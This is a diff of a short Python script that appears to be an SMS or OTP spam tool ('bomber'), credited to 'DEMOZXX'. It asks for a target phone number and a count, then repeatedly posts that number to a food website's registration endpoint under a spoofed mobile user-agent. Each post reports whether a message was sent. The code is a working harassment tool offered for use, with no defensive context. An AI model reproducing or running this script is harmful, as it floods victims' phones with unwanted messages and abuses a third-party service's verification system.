@@ -7,9 +7,6 @@ print (""" \033[91m╔╗╔╗╔╦═══╦╗╔═╦╗─╔╦╗─�
  \033[97m╚╗╔╗╔╣╔═╗║║║╚╣╚═╝║╚═╝╠╣╠╣║─║║║╚══╣║║╚╗
  \033[92m─╚╝╚╝╚╝─╚╩╝╚═╩═══╩═══╩══╩╝─╚═╩═══╩╝╚═╝
  \033[93mAUTOR    =DEMOZXX """)
-os.system('clear')
-print (banner)
-print ('%s[%s+%s] %sIP Kamu %s: %s%s' % (p,h,p,k,m,h,ip))
 yu = input(' target number (ex:088118) ; ')
 eek = int(input('the amount : '))
 hd  = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
@@ -18,6 +15,6 @@ for x in range(eek):
  ho = requests.post('https://www.wakuliner.com/main/reg13',headers=hd,data=dat)
  kntl = json.loads(ho.text)
  if kntl["status"] == 1:
-    print(" no "+yu)
+    print("successfully sent no "+yu)
  else:
     print("Failed to send no "+yu)
